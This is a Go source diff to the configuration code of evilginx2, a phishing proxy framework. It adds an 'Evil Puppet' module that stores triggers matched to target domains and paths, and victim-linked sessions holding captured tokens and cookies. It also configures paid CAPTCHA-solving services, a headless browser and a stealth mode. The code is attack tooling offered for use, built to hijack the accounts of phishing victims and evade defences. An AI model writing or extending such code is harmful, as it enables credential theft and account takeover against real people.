@@ -3,9 +3,8 @@ package core
 import (
 	"fmt"
 	"net/url"
-	"os"
-	"path/filepath"
 	"strings"
+	"time"
 
 	"github.com/kgretzky/evilginx2/log"
 
@@ -29,6 +28,7 @@ type Lure struct {
 	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
 	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
 }
+
 
 type SubPhishlet struct {
 	Name       string            `mapstructure:"name" json:"name" yaml:"name"`
@@ -82,6 +82,8 @@ type Config struct {
 	blacklistConfig *BlacklistConfig
 	gophishConfig   *GoPhishConfig
 	proxyConfig     *ProxyConfig
+	puppetConfig    *PuppetConfig     // NEW: Evil Puppet config
+	puppetSessions  []*PuppetSession  // NEW: Active puppet sessions
 	phishletConfig  map[string]*PhishletConfig
 	phishlets       map[string]*Phishlet
 	phishletNames   []string
@@ -93,7 +95,6 @@ type Config struct {
 	telegramConfig  *TelegramConfig
 	cfg             *viper.Viper
 }
-
 const (
 	CFG_GENERAL      = "general"
 	CFG_CERTIFICATES = "certificates"
@@ -104,6 +105,8 @@ const (
 	CFG_SUBPHISHLETS = "subphishlets"
 	CFG_GOPHISH      = "gophish"
 	CFG_TELEGRAM     = "telegram"
+	CFG_PUPPET       = "puppet"       // NEW
+	CFG_PUPPET_SESSIONS = "puppet_sessions" // NEW
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -113,6 +116,9 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		general:         &GeneralConfig{},
 		certificates:    &CertificatesConfig{},
 		gophishConfig:   &GoPhishConfig{},
+		proxyConfig:     &ProxyConfig{},         // Initialize proxyConfig
+		puppetConfig:    NewDefaultPuppetConfig(), // NEW
+		puppetSessions:  []*PuppetSession{},       // NEW
 		phishletConfig:  make(map[string]*PhishletConfig),
 		phishlets:       make(map[string]*Phishlet),
 		phishletNames:   []string{},
@@ -121,78 +127,56 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		telegramConfig:  &TelegramConfig{},
 	}
 
+	// Setup Viper
 	c.cfg = viper.New()
 	c.cfg.SetConfigType("json")
+	c.cfg.SetConfigName("config")
+	c.cfg.AddConfigPath(cfg_dir)
+	c.cfg.AddConfigPath(path)
 
-	if path == "" {
-		path = filepath.Join(cfg_dir, "config.json")
-	}
-	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0700))
-	if err != nil {
-		return nil, err
-	}
-	var created_cfg bool = false
-	c.cfg.SetConfigFile(path)
-	if _, err := os.Stat(path); os.IsNotExist(err) {
-		created_cfg = true
-		err = c.cfg.WriteConfigAs(path)
-		if err != nil {
-			return nil, err
+	// Set defaults
+	c.cfg.SetDefault(CFG_GENERAL, c.general)
+	c.cfg.SetDefault(CFG_CERTIFICATES, c.certificates)
+	c.cfg.SetDefault(CFG_LURES, c.lures)
+	c.cfg.SetDefault(CFG_PHISHLETS, c.phishletConfig)
+	c.cfg.SetDefault(CFG_BLACKLIST, c.blacklistConfig)
+	c.cfg.SetDefault(CFG_GOPHISH, c.gophishConfig)
+	c.cfg.SetDefault(CFG_TELEGRAM, c.telegramConfig)
+	c.cfg.SetDefault(CFG_PUPPET, c.puppetConfig)
+
+	// Read config
+	if err := c.cfg.ReadInConfig(); err != nil {
+		if _, ok := err.(viper.ConfigFileNotFoundError); ok {
+			// Config file not found; ignore error if desired or log it
+			log.Debug("Config file not found, using defaults")
+		} else {
+			// Config file was found but another error produced
+			log.Error("Config file error: %v", err)
 		}
 	}
 
-	err = c.cfg.ReadInConfig()
-	if err != nil {
-		return nil, err
-	}
-
-	c.cfg.UnmarshalKey(CFG_GENERAL, &c.general)
-	if c.cfg.Get("general.autocert") == nil {
-		c.cfg.Set("general.autocert", true)
-		c.general.Autocert = true
-	}
-
-	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)
-
-	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)
-	c.cfg.UnmarshalKey(CFG_TELEGRAM, &c.telegramConfig)
-
-	if c.general.OldIpv4 != "" {
-		if c.general.ExternalIpv4 == "" {
-			c.SetServerExternalIP(c.general.OldIpv4)
-		}
-		c.SetServerIP("")
-	}
-
-	if !stringExists(c.blacklistConfig.Mode, BLACKLIST_MODES) {
-		c.SetBlacklistMode("unauth")
-	}
-
-	if c.general.UnauthUrl == "" && created_cfg {
-		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
-	}
-	if c.general.HttpsPort == 0 {
-		c.SetHttpsPort(443)
-	}
-	if c.general.DnsPort == 0 {
-		c.SetDnsPort(53)
-	}
-	if created_cfg {
-		c.EnableAutocert(true)
-	}
-
-	c.lures = []*Lure{}
+	// Unmarshal config
+	c.cfg.UnmarshalKey(CFG_GENERAL, c.general)
+	c.cfg.UnmarshalKey(CFG_CERTIFICATES, c.certificates)
 	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
-	c.proxyConfig = &ProxyConfig{}
-	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
 	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
-	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)
+	c.cfg.UnmarshalKey(CFG_BLACKLIST, c.blacklistConfig)
+	c.cfg.UnmarshalKey(CFG_GOPHISH, c.gophishConfig)
+	c.cfg.UnmarshalKey(CFG_TELEGRAM, c.telegramConfig)
 
-	for i := 0; i < len(c.lures); i++ {
-		c.lureIds = append(c.lureIds, GenRandomToken())
+	// Load puppet config
+	c.cfg.UnmarshalKey(CFG_PUPPET, &c.puppetConfig)
+	c.cfg.UnmarshalKey(CFG_PUPPET_SESSIONS, &c.puppetSessions)
+	
+	// Initialize default if empty
+	if c.puppetConfig == nil {
+		c.puppetConfig = NewDefaultPuppetConfig()
+		c.SavePuppetConfig()
 	}
 
-	c.cfg.WriteConfig()
+    // Refresh active hostnames
+	c.refreshActiveHostnames()
+
 	return c, nil
 }
 
@@ -840,4 +824,298 @@ func (c *Config) SetTelegramChatId(chatId string) {
 	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
 	log.Info("telegram chat_id set to: %s", chatId)
 	c.cfg.WriteConfig()
+}
+
+
+// PuppetConfig returns the Evil Puppet configuration
+func (c *Config) GetPuppetConfig() *PuppetConfig {
+	if c.puppetConfig == nil {
+		c.puppetConfig = NewDefaultPuppetConfig()
+	}
+	return c.puppetConfig
+}
+
+
+// SavePuppetConfig saves Evil Puppet configuration
+func (c *Config) SavePuppetConfig() {
+	c.cfg.Set(CFG_PUPPET, c.puppetConfig)
+	c.cfg.WriteConfig()
+}
+
+// SavePuppetSessions saves active puppet sessions
+func (c *Config) SavePuppetSessions() {
+	c.cfg.Set(CFG_PUPPET_SESSIONS, c.puppetSessions)
+	c.cfg.WriteConfig()
+}
+
+// EnablePuppet enables/disables Evil Puppet module
+func (c *Config) EnablePuppet(enabled bool) {
+	c.puppetConfig.Enabled = enabled
+	c.SavePuppetConfig()
+	if enabled {
+		log.Info("Evil Puppet module enabled")
+	} else {
+		log.Info("Evil Puppet module disabled")
+	}
+}
+
+// SetPuppetCaptchaService sets CAPTCHA service
+func (c *Config) SetPuppetCaptchaService(service string) {
+	validServices := []string{"2captcha", "anti-captcha", "capsolver", "none"}
+	if !stringExists(service, validServices) {
+		log.Error("invalid CAPTCHA service. valid options: %v", validServices)
+		return
+	}
+	c.puppetConfig.CaptchaService = service
+	c.SavePuppetConfig()
+	log.Info("Evil Puppet CAPTCHA service set to: %s", service)
+}
+
+// SetPuppetCaptchaAPIKey sets CAPTCHA API key
+func (c *Config) SetPuppetCaptchaAPIKey(apiKey string) {
+	c.puppetConfig.CaptchaAPIKey = apiKey
+	c.SavePuppetConfig()
+	log.Info("Evil Puppet CAPTCHA API key set")
+}
+
+// AddPuppetTrigger adds a new puppet trigger
+func (c *Config) AddPuppetTrigger(trigger *PuppetTrigger) error {
+	// Validate trigger
+	if trigger.Name == "" {
+		return fmt.Errorf("trigger name cannot be empty")
+	}
+	if len(trigger.Domains) == 0 {
+		return fmt.Errorf("trigger must have at least one domain")
+	}
+	if trigger.Token == "" {
+		return fmt.Errorf("trigger token cannot be empty")
+	}
+	if trigger.OpenUrl == "" {
+		return fmt.Errorf("trigger open_url cannot be empty")
+	}
+	
+	// Check for duplicate ID
+	for _, t := range c.puppetConfig.Triggers {
+		if t.Id == trigger.Id && trigger.Id != "" {
+			return fmt.Errorf("trigger with ID %s already exists", trigger.Id)
+		}
+		if t.Name == trigger.Name {
+			return fmt.Errorf("trigger with name %s already exists", trigger.Name)
+		}
+	}
+	
+	// Generate ID if not provided
+	if trigger.Id == "" {
+		trigger.Id = GenRandomToken()
+	}
+	
+	c.puppetConfig.Triggers = append(c.puppetConfig.Triggers, *trigger)
+	c.SavePuppetConfig()
+	log.Info("Added Evil Puppet trigger: %s", trigger.Name)
+	return nil
+}
+
+// UpdatePuppetTrigger updates an existing trigger
+func (c *Config) UpdatePuppetTrigger(id string, trigger *PuppetTrigger) error {
+	for i, t := range c.puppetConfig.Triggers {
+		if t.Id == id {
+			trigger.Id = id // Preserve ID
+			c.puppetConfig.Triggers[i] = *trigger
+			c.SavePuppetConfig()
+			log.Info("Updated Evil Puppet trigger: %s", trigger.Name)
+			return nil
+		}
+	}
+	return fmt.Errorf("trigger with ID %s not found", id)
+}
+
+// DeletePuppetTrigger deletes a trigger
+func (c *Config) DeletePuppetTrigger(id string) error {
+	for i, t := range c.puppetConfig.Triggers {
+		if t.Id == id {
+			name := t.Name
+			c.puppetConfig.Triggers = append(c.puppetConfig.Triggers[:i], c.puppetConfig.Triggers[i+1:]...)
+			c.SavePuppetConfig()
+			log.Info("Deleted Evil Puppet trigger: %s", name)
+			return nil
+		}
+	}
+	return fmt.Errorf("trigger with ID %s not found", id)
+}
+
+// GetPuppetTrigger retrieves a trigger by ID
+func (c *Config) GetPuppetTrigger(id string) (*PuppetTrigger, error) {
+	for _, t := range c.puppetConfig.Triggers {
+		if t.Id == id {
+			return &t, nil
+		}
+	}
+	return nil, fmt.Errorf("trigger with ID %s not found", id)
+}
+
+// GetPuppetTriggersForPhishlet returns triggers for a specific phishlet
+func (c *Config) GetPuppetTriggersForPhishlet(phishlet string) []PuppetTrigger {
+	var triggers []PuppetTrigger
+	for _, t := range c.puppetConfig.Triggers {
+		if t.Phishlet == phishlet || t.Phishlet == "" {
+			if t.Enabled {
+				triggers = append(triggers, t)
+			}
+		}
+	}
+	return triggers
+}
+
+// GetPuppetTriggerForDomain returns triggers matching a domain
+func (c *Config) GetPuppetTriggerForDomain(domain, path string) *PuppetTrigger {
+	for _, t := range c.puppetConfig.Triggers {
+		if !t.Enabled {
+			continue
+		}
+		
+		// Check domain match
+		domainMatch := false
+		for _, d := range t.Domains {
+			if d == "*" || strings.Contains(domain, d) || d == domain {
+				domainMatch = true
+				break
+			}
+		}
+		
+		if !domainMatch {
+			continue
+		}
+		
+		// Check path match
+		pathMatch := false
+		for _, p := range t.Paths {
+			if p == "*" || p == path {
+				pathMatch = true
+				break
+			}
+			// Support simple wildcard
+			if strings.HasSuffix(p, "*") {
+				prefix := strings.TrimSuffix(p, "*")
+				if strings.HasPrefix(path, prefix) {
+					pathMatch = true
+					break
+				}
+			}
+		}
+		
+		if pathMatch {
+			return &t
+		}
+	}
+	return nil
+}
+
+// AddPuppetSession adds a new puppet session
+func (c *Config) AddPuppetSession(session *PuppetSession) {
+	session.StartedAt = time.Now()
+	c.puppetSessions = append(c.puppetSessions, session)
+	c.SavePuppetSessions()
+}
+
+// UpdatePuppetSession updates a puppet session
+func (c *Config) UpdatePuppetSession(id string, updates map[string]interface{}) error {
+	for i, s := range c.puppetSessions {
+		if s.Id == id {
+			// Apply updates
+			if status, ok := updates["status"]; ok {
+				c.puppetSessions[i].Status = status.(string)
+			}
+			if token, ok := updates["token_value"]; ok {
+				c.puppetSessions[i].TokenValue = token.(string)
+			}
+			if cookies, ok := updates["cookies"]; ok {
+				c.puppetSessions[i].Cookies = cookies.([]map[string]interface{})
+			}
+			if err, ok := updates["error"]; ok {
+				c.puppetSessions[i].Error = err.(string)
+			}
+			if updates["completed"] != nil {
+				c.puppetSessions[i].CompletedAt = time.Now()
+			}
+			c.SavePuppetSessions()
+			return nil
+		}
+	}
+	return fmt.Errorf("session with ID %s not found", id)
+}
+
+// GetPuppetSession retrieves a puppet session
+func (c *Config) GetPuppetSession(id string) (*PuppetSession, error) {
+	for _, s := range c.puppetSessions {
+		if s.Id == id {
+			return s, nil
+		}
+	}
+	return nil, fmt.Errorf("session with ID %s not found", id)
+}
+
+// GetPuppetSessionsForVictim returns puppet sessions for a victim session
+func (c *Config) GetPuppetSessionsForVictim(victimSession string) []*PuppetSession {
+	var sessions []*PuppetSession
+	for _, s := range c.puppetSessions {
+		if s.VictimSession == victimSession {
+			sessions = append(sessions, s)
+		}
+	}
+	return sessions
+}
+
+// CleanupPuppetSessions removes old puppet sessions
+func (c *Config) CleanupPuppetSessions(maxAge time.Duration) int {
+	cutoff := time.Now().Add(-maxAge)
+	var remaining []*PuppetSession
+	removed := 0
+	
+	for _, s := range c.puppetSessions {
+		if s.StartedAt.After(cutoff) {
+			remaining = append(remaining, s)
+		} else {
+			removed++
+		}
+	}
+	
+	if removed > 0 {
+		c.puppetSessions = remaining
+		c.SavePuppetSessions()
+	}
+	
+	return removed
+}
+
+// SetPuppetBrowserHeadless sets browser headless mode
+func (c *Config) SetPuppetBrowserHeadless(headless bool) {
+	c.puppetConfig.Browser.Headless = headless
+	c.SavePuppetConfig()
+	if headless {
+		log.Info("Evil Puppet browser set to headless mode")
+	} else {
+		log.Info("Evil Puppet browser set to visible mode (for debugging)")
+	}
+}
+
+// SetPuppetBrowserTimeout sets browser timeout
+func (c *Config) SetPuppetBrowserTimeout(timeout int) {
+	if timeout < 10 || timeout > 300 {
+		log.Error("timeout must be between 10 and 300 seconds")
+		return
+	}
+	c.puppetConfig.Browser.Timeout = timeout
+	c.SavePuppetConfig()
+	log.Info("Evil Puppet browser timeout set to %d seconds", timeout)
+}
+
+// SetPuppetStealthEnabled enables/disables stealth mode
+func (c *Config) SetPuppetStealthEnabled(enabled bool) {
+	c.puppetConfig.Stealth.Enabled = enabled
+	c.SavePuppetConfig()
+	if enabled {
+		log.Info("Evil Puppet stealth mode enabled")
+	} else {
+		log.Info("Evil Puppet stealth mode disabled")
+	}
 }
